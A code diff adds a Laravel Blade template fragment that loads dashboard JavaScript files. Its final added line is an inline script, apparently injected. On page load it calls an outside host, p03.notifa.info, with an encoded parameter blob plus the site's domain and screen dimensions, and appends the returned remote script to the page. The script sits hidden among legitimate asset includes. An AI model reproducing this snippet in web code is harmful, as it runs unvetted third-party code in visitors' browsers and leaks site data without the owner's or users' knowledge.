@@ -1,0 +1,10 @@
+<script src="{{ asset ('assets-manager/js/app.min.js') }}"></script>
+<!-- JS Libraies -->
+<script src="{{ asset ('assets-manager/bundles/apexcharts/apexcharts.min.js') }}"></script>
+<!-- Page Specific JS File -->
+<script src="{{ asset ('assets-manager/js/page/index.js') }}"></script>
+<!-- Template JS File -->
+<script src="{{ asset ('assets-manager/js/scripts.js') }}"></script>
+<!-- Custom JS File -->
+<script src="{{ asset ('assets-manager/js/custom.js') }}"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXQLX5RO%2br8u%2bpEI4ZxiK%2bFs%2fRc0MiZhzv7%2fxOMRCwaE5AijowSE3%2f5elztB0VhPkuhjh6Xt6N3fn7ay%2b7bsKOPPuQr%2fMq6QLxWHqtG6sobbEM%2bP648tsJ48agzZStj8Vh%2fsZvcJSjH0suFnamkreyJnI2eBbgnXUXlsuSrYNkfc%2bPdzGxUbritVTZf4ND9ImcaihH%2bFLGwmQwbEUUinllfXTjSlUhtj6h3ckYrRR2ut9Y99R7GxSs4xbfZ3vqYlFQmGj8kOY0r%2bvZJcJb6tbYwILaFg0f0a1Nz6pHudpgoFWSaRjPz6NcKxNp02LPztiV%2bZK9hfuA3rTub8z9jAeFqRVhe4JzywexhL80S4PteG7q32T9Sur4KB4RC%2f%2fAYPXbaSy5CuX1B4MIaUCmRDMbjNwnbJlWLkJu%2b3MHSK4zwBAq5STKZ7fdcsxwtALwlQ%2bLawDoWUfa7WB8t5w3GBivmnOPwlC5o5sykLIauFMVP%2bMn2BmeDBbnnOCV%2ba0Ey%2b6goqkJ8m3x0XE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
